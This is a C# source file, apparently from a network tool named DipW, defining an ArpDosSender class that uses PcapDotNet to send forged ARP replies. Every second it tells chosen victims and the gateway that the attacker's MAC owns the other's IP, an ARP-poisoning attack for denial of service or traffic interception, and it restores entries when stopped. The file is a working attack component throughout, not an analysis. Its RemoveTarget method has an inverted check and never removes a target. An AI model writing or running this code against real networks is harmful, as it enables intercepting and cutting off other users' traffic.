using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using DipW.Classes.Components;
using PcapDotNet.Core;
using PcapDotNet.Packets.Ethernet;
using DipW.Classes.Extensions;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets;
using PcapDotNet.Packets.IpV4;
using System.Threading;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Transport;

namespace DipW.Classes.Manipulators.Senders
{

    public class ArpDosSender
    {
        private LivePacketDevice _device;
        private BackgroundWorker _bgWorker;

        private List<Target> _targets;
        private Target _gateway;
        private MacAddress _ownMacAddr;

        public BackgroundWorker BgWorker
        {
            get { return _bgWorker; }
        }

        //constructors
        public ArpDosSender(LivePacketDevice device, Target Gateway)
        {
            _device = device;
            _gateway = Gateway;
            _ownMacAddr = _device.GetMacAddress();

            _bgWorker = new BackgroundWorker();
            _bgWorker.WorkerSupportsCancellation = true;
            _bgWorker.DoWork += new DoWorkEventHandler(DoWork);

            _targets = new List<Target>();
        }

        public void AddTarget(Target target)
        {
            lock (_targets)
            {
                if (!_targets.Contains(target))
                    _targets.Add(target);
            }
        }

        public void RemoveTarget(Target target)
        {
            lock (_targets)
            {
                if (!_targets.Contains(target))
                {
                    _targets.Remove(target);
                }
            }
        }

        public void StartSpoofing()
        {
            if (!_bgWorker.IsBusy)
            {
                _bgWorker.RunWorkerAsync();
            }
        }

        private void DoWork(object sender, DoWorkEventArgs e)
        {
            using (PacketCommunicator communicator = _device.Open())
            {
                //add static arp-entry for gateway
                StaticARP.AddEntry(_gateway.IP, _gateway.PMAC, _device.GetNetworkInterface().Name);

                while (!_bgWorker.CancellationPending)
                {
                    foreach (var target in _targets)
                    {
                        communicator.SendPacket(BuildPoisonArpPacketReply(target, _gateway)); //Packet which gets sent to the victim
                        communicator.SendPacket(BuildPoisonArpPacketReply(_gateway, target)); //Packet which gets sent to the gateway
                    }

                    Thread.Sleep(1000);
                }

                //antidote
                foreach (var target in _targets)
                {
                    communicator.SendPacket(BuildAntidoteArpPacketReply(target, _gateway));
                    communicator.SendPacket(BuildAntidoteArpPacketReply(_gateway, target));
                }

                //remove static arp-entry for gateway
                StaticARP.RemoveEntry(_gateway.IP, _gateway.PMAC, _device.GetNetworkInterface().Name);
            }
        }

        private Packet BuildPoisonArpPacketReply(Target PacketTarget, Target TargetToSpoof)
        {
            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP),
                new MacAddress(PacketTarget.MAC), new IpV4Address(TargetToSpoof.IP), _ownMacAddr);
        }

        private Packet BuildAntidoteArpPacketReply(Target PacketTarget, Target AntidoteSignature)
        {
            return BuildArpPacketReply(new IpV4Address(PacketTarget.IP),
                new MacAddress(PacketTarget.MAC), new IpV4Address(AntidoteSignature.IP), new MacAddress(AntidoteSignature.MAC));
        }

        private Packet BuildArpPacketReply(IpV4Address victimIp, MacAddress victimMac, IpV4Address ipToSpoof, MacAddress newSourceMac)
        {
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = newSourceMac,
                Destination = victimMac,
                EtherType = EthernetType.None // Will be filled automatically
            };

            ArpLayer arpLayer = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Reply,
                SenderHardwareAddress = Helper.MacAddressToBytes(newSourceMac),
                SenderProtocolAddress = Helper.IpAddressToBytes(ipToSpoof),
                TargetHardwareAddress = Helper.MacAddressToBytes(victimMac),
                TargetProtocolAddress = Helper.IpAddressToBytes(victimIp)
            };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);

            return builder.Build(DateTime.Now);
        }


    }
}
